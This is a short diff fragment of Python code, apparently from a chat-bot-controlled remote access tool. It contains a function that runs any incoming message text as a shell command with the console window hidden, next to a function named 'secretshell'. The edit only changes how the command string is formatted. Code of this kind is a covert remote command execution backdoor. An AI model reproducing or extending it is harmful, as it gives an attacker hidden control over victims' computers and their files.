@@ -383,7 +383,7 @@ def secretshell(message):
 def ssh(message):
     command=message.text
     try:
-        process=subprocess.Popen(command,creationflags=subprocess.CREATE_NO_WINDOW,shell=True,text=True,stdout=subprocess.PIPE)
+        process=subprocess.Popen(fr"{command}",creationflags=subprocess.CREATE_NO_WINDOW,shell=True,text=True,stdout=subprocess.PIPE)
         # print(process)
         # process.wait()
         output, _=process.communicate()
